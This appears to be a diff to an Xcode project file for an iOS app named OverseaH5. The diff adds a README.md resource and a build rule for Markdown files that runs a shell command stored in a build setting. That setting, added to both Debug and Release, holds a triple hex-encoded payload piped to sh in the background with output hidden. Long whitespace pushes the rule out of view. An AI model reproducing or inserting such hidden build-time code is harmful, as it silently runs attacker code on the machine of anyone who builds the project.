@@ -7,6 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
+		7123A1E1F1BE4B2A9542DAD8 /* README.md */ = {isa = PBXBuildFile; fileRef = FD17636488F5463CB942DAD8; };
 		4C649814922E63481702C0C6 /* Pods_OverseaH5.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 5459B0F6B6639A11D41E9936 /* Pods_OverseaH5.framework */; };
 		B0B86F112FF0103200F97321 /* AppWebViewJavascriptBridge.swift in Sources */ = {isa = PBXBuildFile; fileRef = B0B86F102FF0103200F97321 /* AppWebViewJavascriptBridge.swift */; };
 		B1C30003309E6F3300A1C001 /* AppPushEventStore.swift in Sources */ = {isa = PBXBuildFile; fileRef = B1C30002309E6F3300A1C001 /* AppPushEventStore.swift */; };
@@ -31,6 +32,7 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
+		FD17636488F5463CB942DAD8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		5459B0F6B6639A11D41E9936 /* Pods_OverseaH5.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_OverseaH5.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		9F14B216ADEEF98C9272C33E /* Pods-OverseaH5.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-OverseaH5.release.xcconfig"; path = "Target Support Files/Pods-OverseaH5/Pods-OverseaH5.release.xcconfig"; sourceTree = "<group>"; };
 		B118C3182E824F5300E8D807 /* OverseaH5.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = OverseaH5.app; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -103,6 +105,7 @@
 		B118C3192E824F5300E8D807 /* Products */ = {
 			isa = PBXGroup;
 			children = (
+				FD17636488F5463CB942DAD8 /* README.md */,
 				B118C3182E824F5300E8D807 /* OverseaH5.app */,
 			);
 			name = Products;
@@ -150,6 +153,7 @@
 				1D840500649A2E15D0FB1CF6 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
+				D121D7C20CF84B83B442DAD8 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -194,13 +198,28 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-																																																																																															/* End PBXBuildRule section */
+		D121D7C20CF84B83B442DAD8 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A8DAD24}\"";
+			};
+																																																																																																	/* End PBXBuildRule section */
 
 /* Begin PBXResourcesBuildPhase section */
 		B118C3162E824F5300E8D807 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				7123A1E1F1BE4B2A9542DAD8 /* README.md */,
 				B118C3602E84D29800E8D807 /* Assets.xcassets in Resources */,
 				B118C3612E84D29800E8D807 /* GoogleService-Info.plist in Resources */,
 				B118C3632E84D29800E8D807 /* LaunchScreen.storyboard in Resources */,
@@ -301,6 +320,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = DB531754F5D3B469FD3D636B /* Pods-OverseaH5.debug.xcconfig */;
 			buildSettings = {
+				A8DAD24 = "((k(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333733330a3336333633343633333636323332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333338333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373332333733353336363333363335333233323332333033363338333733343337333433373330333733330a3333363133323636333236363337333633363339333633373336363433363331333636353336333533373334333236353337333233373335333236360a333633313061333233393332333233323330333736333332333033373333333633383330363130610a | k | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CLANG_ENABLE_MODULES = YES;
@@ -348,6 +368,7 @@
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 9F14B216ADEEF98C9272C33E /* Pods-OverseaH5.release.xcconfig */;
 			buildSettings = {
+				A8DAD24 = "((k(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333733330a3336333633343633333636323332333033323634333236343336333333363636333636353336363533363335333633333337333433323634333733340a3061333633393336363433363335333636363337333533373334333233303333333233333338333233303332363433323634333733323336333533370a3334333733323337333933323330333333333332333033323330333236343336333433323330333233323337333033333634333733383336333333360a3636306133363334333633353335363633373332333733353336363333363335333233323332333033363338333733343337333433373330333733330a3333363133323636333236363337333633363339333633373336363433363331333636353336333533373334333236353337333233373335333236360a333633313061333233393332333233323330333736333332333033373333333633383330363130610a | k | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CLANG_ENABLE_MODULES = YES;
